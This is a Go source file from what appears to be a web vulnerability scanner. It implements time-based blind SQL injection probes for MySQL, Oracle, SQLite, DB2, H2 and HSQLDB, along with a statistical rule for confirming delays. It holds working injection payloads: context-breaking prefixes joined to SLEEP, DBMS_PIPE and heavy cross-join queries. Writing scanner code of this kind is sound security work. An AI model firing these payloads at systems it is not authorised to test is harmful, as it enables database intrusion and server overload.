package scanner

// Time-based blind SQL injection for the dialects Burp's recoverable banks do not cover
// (burpsy-react-ui-v0ei.1): MySQL/MariaDB, Oracle, SQLite, IBM DB2, H2 and HSQLDB — and the evidence
// rule every timing family, the recovered PostgreSQL / SQL Server ones included, is confirmed under.
//
// # Provenance, honestly
//
// None of the payload texts in this file are recovered Burp bytes. Burp's MySQL and Oracle timing
// banks live inside ZKM string decoders this tree does not run (see sqli_techniques.go), and Burp has
// no SQLite, DB2, H2 or HSQLDB timing family at all. The texts below are burpsy's own, written from
// each engine's documented functions, and the delay primitive of every family is a function or
// catalog object that exists in ONE engine family and is an error everywhere else — which is what lets
// a confirmed delay name its DBMS:
//
//	MySQL/MariaDB  SLEEP(n); BENCHMARK(n, MD5(1)) as a work-unit fallback when SLEEP is filtered
//	Oracle         DBMS_PIPE.RECEIVE_MESSAGE(pipe, n); a ROWNUM-bounded ALL_OBJECTS cross join
//	SQLite         a recursive CTE whose rows call RANDOMBLOB (no sleep function exists)
//	IBM DB2        a SYSIBM.SYSCOLUMNS cross join bounded by FETCH FIRST n ROWS ONLY
//	H2             SYSTEM_RANGE(1, n) with a predicate (no sleep function exists)
//	HSQLDB         an INFORMATION_SCHEMA.SYSTEM_COLUMNS cross join bounded by LIMIT n
//
// The H2, HSQLDB and SQLite spellings were measured against the real engines (H2 2.1.214, HSQLDB
// 2.7.4, SQLite 3.45): each runs in time linear in n with constant memory, and each is an error on
// the other two. The MySQL, Oracle and DB2 spellings were NOT run against a real engine here; they
// are exercised against vulnapp's dialect-aware simulations only.
//
// # Heavy queries are bounded, and off by default
//
// A sleep costs the server a waiting connection; a heavy query costs it CPU. Every heavy family is
// therefore (a) bounded by an explicit work size in the payload itself — a range bound, a ROWNUM,
// a FETCH FIRST or a LIMIT — never by the size of a catalog table, (b) calibrated so the confirming
// probes aim at one to three seconds of work whatever the server's speed, never more than ten times
// the first probe's own size, and (c) sent only when ScanConfig.CheckSqliHeavyQuery is on.
//
// The zero-work control of a heavy family is a handful of units, never zero: HSQLDB reads `LIMIT 0`
// as "no limit", so a zero control there is an unbounded three-way cross join of the catalog
// (measured: an OutOfMemoryError after 55 s). Every heavy request also carries a small unique offset
// in its work size so a result cache cannot answer a repeat (see sqlTimingProbe).
//
// # The evidence rule
//
// A single slow response is what a GC pause, a throttle or a tarpit also produces, and a delay that
// merely repeats is what a uniformly slow endpoint produces. A timing finding therefore needs all of:
//
//  1. the first probe slow against the baseline (a heavy family's first probe also calibrates);
//  2. two zero-delay controls, both as fast as the baseline — and the spread of {baseline, controls}
//     is the measured jitter;
//  3. two DIFFERENT delay values whose response times scale with the value: each excess over the
//     slowest control clears both a floor (for a sleep family, 60% of the seconds asked for) and
//     three times the jitter, and the ratio of the excesses tracks the ratio of the values;
//  4. a repeat of one of the two values, agreeing with its first reading;
//  5. a foreign-dialect control: the same place with ANOTHER engine's sleep spelling, which must NOT
//     delay. An endpoint that sleeps on any sleep-shaped text is not executing this dialect's SQL, so
//     the delay is reported undecided rather than attributed — and the DBMS is named only when its
//     own family produced the delay and the foreign spelling did not.

import (
	"context"
	"fmt"
	"math/rand/v2"
	"strings"
	"time"

	"github.com/burpsy-go/burpsy/internal/bcheck"
)

// sqlDelayContext is one quoting context the delay expression is placed in: what closes the
// application's own syntax before it and what re-opens it after, so the statement still parses.
type sqlDelayContext struct {
	name, prefix, suffix string
}

// sqlDelayContexts are the places a value sits in a statement. Each wraps a scalar expression E that
// delays and evaluates to a non-negative number: `0<=E` is true whenever E ran, so the original row
// match is unchanged and the delay is the only thing the probe adds.
//
// The string and parenthesised forms re-open what they closed (`AND 'a'='a`, `AND (1=1`) instead of
// commenting the rest of the statement out, so they work whatever follows the value — a comment
// marker is spelled differently across these engines and is dropped by some frameworks. ORDER BY
// takes the expression as a further sort key, where a scalar subquery is evaluated once.
var sqlDelayContexts = []sqlDelayContext{
	{name: "numeric", prefix: " AND 0<=", suffix: ""},
	{name: "string", prefix: "' AND 0<=", suffix: " AND 'a'='a"},
	{name: "parenthesised numeric", prefix: ") AND 0<=", suffix: " AND (1=1"},
	{name: "parenthesised string", prefix: "') AND 0<=", suffix: " AND ('a'='a"},
	{name: "ORDER BY", prefix: ",", suffix: ""},
}

// sqlDelayFamily is one engine's delay primitive.
type sqlDelayFamily struct {
	dbms      string
	primitive string
	expr      func(n int64) string
	methods   []string
	// heavy marks a work-unit family: n is rows or iterations, not seconds, and the delay per unit is
	// unknown until the first probe measures it.
	heavy bool
	// probeSize is a heavy family's first-probe work size: about half a second on a commodity server.
	probeSize int64
}

// The scalar expressions. The sleep calls sit inside a derived table (MySQL) or a scalar subquery
// on DUAL (Oracle) so the engine evaluates them once per statement, not once per row it examines.
func mysqlSleepExpr(n int64) string { return fmt.Sprintf("(SELECT 1 FROM (SELECT SLEEP(%d))x)", n) }
func mysqlBenchmarkExpr(n int64) string {
	return fmt.Sprintf("(SELECT 1 FROM (SELECT BENCHMARK(%d,MD5(1)))x)", n)
}
func oraclePipeExpr(n int64) string {
	return fmt.Sprintf("(SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),%d) FROM DUAL)", n)
}
func oracleHeavyExpr(n int64) string {
	return fmt.Sprintf("(SELECT COUNT(*) FROM ALL_OBJECTS A,ALL_OBJECTS B WHERE ROWNUM<=%d)", n)
}
func sqliteHeavyExpr(n int64) string {
	return fmt.Sprintf("(WITH RECURSIVE r(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM r WHERE i<%d) SELECT COUNT(RANDOMBLOB(16)) FROM r)", n)
}
func db2HeavyExpr(n int64) string {
	return fmt.Sprintf("(SELECT COUNT(*) FROM (SELECT 1 FROM SYSIBM.SYSCOLUMNS A,SYSIBM.SYSCOLUMNS B,SYSIBM.SYSCOLUMNS C FETCH FIRST %d ROWS ONLY) T)", n)
}
func h2HeavyExpr(n int64) string {
	return fmt.Sprintf("(SELECT COUNT(*) FROM SYSTEM_RANGE(1,%d) WHERE X>0)", n)
}
func hsqldbHeavyExpr(n int64) string {
	return fmt.Sprintf("(SELECT COUNT(*) FROM (SELECT 1 FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS A,INFORMATION_SCHEMA.SYSTEM_COLUMNS B,INFORMATION_SCHEMA.SYSTEM_COLUMNS C LIMIT %d) T)", n)
}
func pgSleepExpr(n int64) string { return fmt.Sprintf("(SELECT pg_sleep(%d))", n) }

// sqlDelayFamilies is the bank in send order: the sleep families first (cheap and exact), then the
// heavy families, MySQL's BENCHMARK last because it is MySQL's fallback for an endpoint that filters
// SLEEP. Order only decides cost: the bank stops at the first confirmed delay.
func sqlDelayFamilies() []sqlDelayFamily {
	mysql := []string{MethodTimeDelays, MethodMySQLSpecific}
	oracle := []string{MethodTimeDelays, MethodOracleSpecific}
	generic := []string{MethodTimeDelays}
	return []sqlDelayFamily{
		{dbms: "MySQL/MariaDB", primitive: "SLEEP", expr: mysqlSleepExpr, methods: mysql},
		{dbms: "Oracle", primitive: "DBMS_PIPE.RECEIVE_MESSAGE", expr: oraclePipeExpr, methods: oracle},
		{dbms: "H2", primitive: "SYSTEM_RANGE heavy query", expr: h2HeavyExpr, methods: generic, heavy: true, probeSize: 5_000_000},
		{dbms: "HSQLDB", primitive: "SYSTEM_COLUMNS heavy query", expr: hsqldbHeavyExpr, methods: generic, heavy: true, probeSize: 1_000_000},
		{dbms: "SQLite", primitive: "RANDOMBLOB recursive heavy query", expr: sqliteHeavyExpr, methods: generic, heavy: true, probeSize: 2_000_000},
		{dbms: "IBM DB2", primitive: "SYSIBM heavy query", expr: db2HeavyExpr, methods: generic, heavy: true, probeSize: 5_000_000},
		{dbms: "Oracle", primitive: "ALL_OBJECTS heavy query", expr: oracleHeavyExpr, methods: oracle, heavy: true, probeSize: 5_000_000},
		{dbms: "MySQL/MariaDB", primitive: "BENCHMARK", expr: mysqlBenchmarkExpr, methods: mysql, heavy: true, probeSize: 2_000_000},
	}
}

// sqlDialectDelayPayloads renders every family in every quoting context. The foreign control of a
// MySQL family is PostgreSQL's pg_sleep; every other family's is MySQL's SLEEP — in the same context.
func sqlDialectDelayPayloads(delay time.Duration) []sqlTimingPayload {
	seconds := delaySeconds(delay)
	var out []sqlTimingPayload
	for _, fam := range sqlDelayFamilies() {
		foreignExpr := mysqlSleepExpr
		if strings.HasPrefix(fam.dbms, "MySQL") {
			foreignExpr = pgSleepExpr
		}
		for _, c := range sqlDelayContexts {
			c, fam := c, fam
			render := func(n int64) string { return c.prefix + fam.expr(n) + c.suffix }
			first := seconds
			if fam.heavy {
				first = fam.probeSize
			}
			out = append(out, sqlTimingPayload{
				payload:   render(first),
				render:    render,
				methods:   fam.methods,
				dbms:      fam.dbms,
				primitive: fam.primitive,
				context:   c.name,
				heavy:     fam.heavy,
				probeSize: fam.probeSize,
				foreign:   func(n int64) string { return c.prefix + foreignExpr(n) + c.suffix },
			})
		}
	}
	return out
}

func delaySeconds(delay time.Duration) int64 {
	s := int64(delay / time.Second)
	if s < 1 {
		s = 1
	}
	return s
}

// The calibration and evidence constants. None is a recovered Burp value; each is a documented choice.
const (
	// heavyFirstSignal is the excess a heavy family's first probe must show before the family is
	// worth confirming. Below it, the first probe is the only request the family costs.
	heavyFirstSignal = 300 * time.Millisecond
	// heavyLowTarget is what the low confirming value is calibrated to take; the high value is twice it.
	heavyLowTarget = 1500 * time.Millisecond
	// heavyMaxScale bounds the low confirming value at this multiple of the first probe's size, so a
	// heavy family never asks for more than twice that (the high value) whatever the calibration says.
	heavyMaxScale = 5
	// heavyMinExcess is the floor every heavy confirming reading must clear over the slowest control.
	heavyMinExcess = 500 * time.Millisecond
	// sleepLowSeconds is the low confirming delay of a sleep family; the high one is the first probe's.
	sleepLowSeconds = 2
	// delayJitterFactor is how many times the measured jitter every excess must clear.
	delayJitterFactor = 3
	// heavyNonceSpan bounds the unique offset each heavy request adds to its work size.
	heavyNonceSpan = 997
)

// delayMeasurement is everything a scaling verdict reads.
type delayMeasurement struct {
	baseline time.Duration
	controls []time.Duration // zero-delay (sleep) or one-unit (heavy) probes
	lo, hi   []time.Duration // readings at the two delay values
	loValue  int64
	hiValue  int64
	// seconds marks values that are seconds (a sleep family), which adds an absolute check: each
	// reading must show the delay it asked for, not merely scale.
	seconds bool
}

// confirmDelayScaling is the timing evidence rule (see the file header).
func confirmDelayScaling(m delayMeasurement) (InjectionEvidence, string) {
	if len(m.controls) < 2 || len(m.lo) == 0 || len(m.hi) == 0 || len(m.lo)+len(m.hi) < 3 ||
		m.loValue <= 0 || m.hiValue <= m.loValue {
		return InjectionEvidenceInconclusive, "incomplete measurement"
	}
	ref, floor := m.baseline, m.baseline
	for _, c := range m.controls {
		ref, floor = durMax(ref, c), durMin(floor, c)
	}
	jitter := ref - floor

	minLo := heavyMinExcess
	if m.seconds {
		minLo = time.Duration(float64(time.Duration(m.loValue)*time.Second) * TimingMargin)
	}
	// The controls first: a zero-delay probe as slow as a delayed one means the endpoint is slow
	// now, whatever the payload says.
	for _, c := range m.controls {
		if c-m.baseline >= minLo {
			return InjectionEvidenceNone, fmt.Sprintf("a zero-delay control took %s against a %s baseline", c, m.baseline)
		}
	}
	excess := func(ds []time.Duration) (lo, hi, mean time.Duration) {
		lo, hi = ds[0]-ref, ds[0]-ref
		var sum time.Duration
		for _, d := range ds {
			e := d - ref
			lo, hi, sum = durMin(lo, e), durMax(hi, e), sum+e
		}
		return lo, hi, sum / time.Duration(len(ds))
	}
	loMin, loMax, loMean := excess(m.lo)
	hiMin, hiMax, hiMean := excess(m.hi)
	need := durMax(minLo, delayJitterFactor*jitter)
	if loMin < need {
		return InjectionEvidenceNone, fmt.Sprintf("the low value's excess %s does not clear %s (jitter %s)", loMin, need, jitter)
	}
	// The repeat agrees with the first reading of the same value.
	if loMax > 2*loMin || hiMax > 2*hiMin {
		return InjectionEvidenceNone, fmt.Sprintf("a repeated value disagreed with itself (low %s-%s, high %s-%s)", loMin, loMax, hiMin, hiMax)
	}
	// Scaling: the excesses are in proportion to the values. With the low excess already clear of the
	// floor and the jitter, a ratio at least halfway to the value ratio also puts the high reading
	// beyond both (for a sleep family: past the seconds it asked for).
	want := float64(m.hiValue) / float64(m.loValue)
	ratio := float64(hiMean) / float64(loMean)
	if ratio < 1+(want-1)/2 || ratio > want*1.6 {
		return InjectionEvidenceNone, fmt.Sprintf("the excess ratio %.2f does not track the value ratio %.2f", ratio, want)
	}
	return InjectionEvidenceTiming, fmt.Sprintf("excess %s at %d and %s at %d (ratio %.2f for %.2f), jitter %s",
		loMean, m.loValue, hiMean, m.hiValue, ratio, want, jitter)
}

// timingOutcome is what one timing probe returns to the bank walk besides its InjectionProbe:
// whether the point's delay followed a foreign dialect's spelling, which ends the walk for the point —
// every further family would ask the same unanswerable question at the cost of a delay each.
type timingOutcome struct {
	notAttributable bool
}

// sqlTimingProbe sends one family's probe in one place and confirms it under confirmDelayScaling and
// the foreign-dialect control.
func sqlTimingProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, tp sqlTimingPayload, delay time.Duration) (InjectionProbe, timingOutcome) {
	out := InjectionProbe{Payload: tp.payload}
	for _, method := range tp.methods {
		if h.withhold(method, 1) {
			return withheldProbe(p, tp.payload, method), timingOutcome{}
		}
	}
	where := fmt.Sprintf("%s %q", p.Kind, p.Name)
	label := tp.dbms + " " + tp.primitive + ", " + tp.context + " context"
	// A heavy query is deterministic, so an engine with a result cache (H2 reuses the result of an
	// identical statement while no table changed; MySQL's query cache did the same) answers its exact
	// repeat in a millisecond — measured against an application on H2 2.1.214: a repeated 15M-row probe
	// took 1.49 s, then 0.8 ms. Every heavy request therefore adds a small unique offset to its work
	// size, so no two statements are the same text; the offset is under heavyNonceSpan units, which
	// is noise against the millions a confirming probe asks for and keeps a control at a handful.
	used := map[int64]bool{}
	spell := func(n int64) string {
		if !tp.heavy {
			return tp.render(n)
		}
		for {
			v := n + 1 + rand.Int64N(heavyNonceSpan)
			if !used[v] {
				used[v] = true
				return tp.render(v)
			}
		}
	}
	send := func(n int64) (time.Duration, error) {
		r, err := h.SendAppending(ctx, p, spell(n))
		return r.Duration, err
	}
	undecided := func(why string) (InjectionProbe, timingOutcome) {
		out.Evidence = InjectionEvidenceInconclusive
		out.Detail = fmt.Sprintf("%s: %s: %s", where, label, why)
		return out, timingOutcome{}
	}
	base := h.baseline.Duration

	seconds := delaySeconds(delay)
	m := delayMeasurement{baseline: base, seconds: !tp.heavy}
	// The control asks for zero; spell turns a heavy family's zero into 1..heavyNonceSpan units —
	// never 0, which HSQLDB reads as LIMIT 0, no limit at all.
	const zero = 0
	firstValue := seconds
	if tp.heavy {
		firstValue = tp.probeSize
	}
	first, err := h.SendAppending(ctx, p, spell(firstValue))
	if err != nil {
		return undecided(fmt.Sprintf("probe not sent: %v", err))
	}
	if tp.heavy {
		d0 := first.Duration - base
		if d0 < heavyFirstSignal {
			out.Evidence = InjectionEvidenceNone
			out.Detail = fmt.Sprintf("%s: %s: baseline %s, %d units took %s: %s", where, label, base, tp.probeSize, first.Duration, InjectionEvidenceNone)
			return out, timingOutcome{}
		}
		lo := int64(float64(tp.probeSize) * float64(heavyLowTarget) / float64(d0))
		if lo > heavyMaxScale*tp.probeSize {
			lo = heavyMaxScale * tp.probeSize
		}
		if lo < tp.probeSize {
			lo = tp.probeSize
		}
		m.loValue, m.hiValue = lo, 2*lo
	} else {
		if ev := ClassifyTimingEvidence(base, first.Duration, delay); ev != InjectionEvidenceTiming {
			out.Evidence = ev
			out.Detail = fmt.Sprintf("%s: %s: baseline %s, injected %s, requested %s: %s", where, label, base, first.Duration, delay, ev)
			return out, timingOutcome{}
		}
		m.loValue, m.hiValue = sleepLowSeconds, seconds
		m.hi = append(m.hi, first.Duration)
	}

	// control, low, control, high, and the repeat: the low value for a heavy family (its first probe
	// was a calibration at another size), the high one again for a sleep family.
	steps := []struct {
		n    int64
		into *[]time.Duration
	}{{zero, &m.controls}, {m.loValue, &m.lo}, {zero, &m.controls}, {m.hiValue, &m.hi}}
	if tp.heavy {
		steps = append(steps, struct {
			n    int64
			into *[]time.Duration
		}{m.loValue, &m.lo})
	}
	for _, s := range steps {
		d, err := send(s.n)
		if err != nil {
			return undecided(fmt.Sprintf("one slow response, and its confirmation could not be sent: %v", err))
		}
		*s.into = append(*s.into, d)
	}
	ev, why := confirmDelayScaling(m)
	measured := fmt.Sprintf("baseline %s, zero-delay controls %v, %d: %v, %d: %v", base, m.controls, m.loValue, m.lo, m.hiValue, m.hi)
	if ev != InjectionEvidenceTiming {
		out.Evidence = ev
		out.Detail = fmt.Sprintf("%s: %s: %s; %s: %s", where, label, measured, why, ev)
		return out, timingOutcome{}
	}

	// The foreign-dialect control: the same place, another engine's sleep spelling.
	foreign, err := h.SendAppending(ctx, p, tp.foreign(seconds))
	if err != nil {
		return undecided(fmt.Sprintf("%s; %s, but the foreign-dialect control could not be sent: %v", measured, why, err))
	}
	if ClassifyTimingEvidence(base, foreign.Duration, delay) != InjectionEvidenceNone {
		out.Evidence = InjectionEvidenceInconclusive
		out.Detail = fmt.Sprintf("%s: %s: %s; %s, but another dialect's sleep in the same place delayed too (%s), "+
			"so the delay follows sleep-shaped text rather than %s's SQL: not attributed",
			where, label, measured, why, foreign.Duration, tp.dbms)
		return out, timingOutcome{notAttributable: true}
	}
	out.Evidence = InjectionEvidenceTiming
	out.Detail = fmt.Sprintf("%s: DBMS %s: its own %s delayed the response in the %s context — %s; %s; "+
		"a foreign-dialect sleep in the same place took %s: %s",
		where, tp.dbms, tp.primitive, tp.context, measured, why, foreign.Duration, out.Evidence)
	return out, timingOutcome{}
}

// heavyQueryTimingEnabled reports whether the run admits the heavy-query families.
func heavyQueryTimingEnabled(h *ProbeHarness) bool {
	return h != nil && h.scanner != nil && h.scanner.config != nil && h.scanner.config.CheckSqliHeavyQuery
}

func durMin(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

func durMax(a, b time.Duration) time.Duration {
	if a > b {
		return a
	}
	return b
}
